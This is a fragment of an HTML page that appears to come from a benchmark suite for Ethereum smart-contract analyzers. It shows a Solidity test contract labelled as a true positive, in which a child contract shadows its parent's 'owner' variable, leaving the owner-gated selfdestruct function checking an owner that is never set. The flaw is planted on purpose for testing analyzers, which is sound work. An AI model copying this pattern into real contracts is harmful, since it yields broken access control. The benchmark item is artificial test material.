	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
      </tr>
    </table>
    <h4>Source Code</h4>
    <div class="highlight"><pre><span></span><span class="kd">contract</span> <span class="n">Suicidal</span> <span class="p">{</span>
  <span class="kt">address</span> <span class="n">owner</span><span class="p">;</span>
  <span class="kd">function</span> <span class="nb">suicide</span><span class="p">()</span> <span class="kr">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span><span class="p">)</span> <span class="p">{</span>
    <span class="nf">require</span><span class="p">(</span><span class="n">owner</span> <span class="o">==</span> <span class="nb">msg.sender</span><span class="p">);</span>
    <span class="nb">selfdestruct</span><span class="p">(</span><span class="n">owner</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="kd">contract</span> <span class="n">C</span> <span class="kr">is</span> <span class="n">Suicidal</span> <span class="p">{</span>
  <span class="kt">address</span> <span class="n">owner</span><span class="p">;</span>
  <span class="kd">function</span> <span class="n">C</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg.sender</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div>

      
  </body>
</html>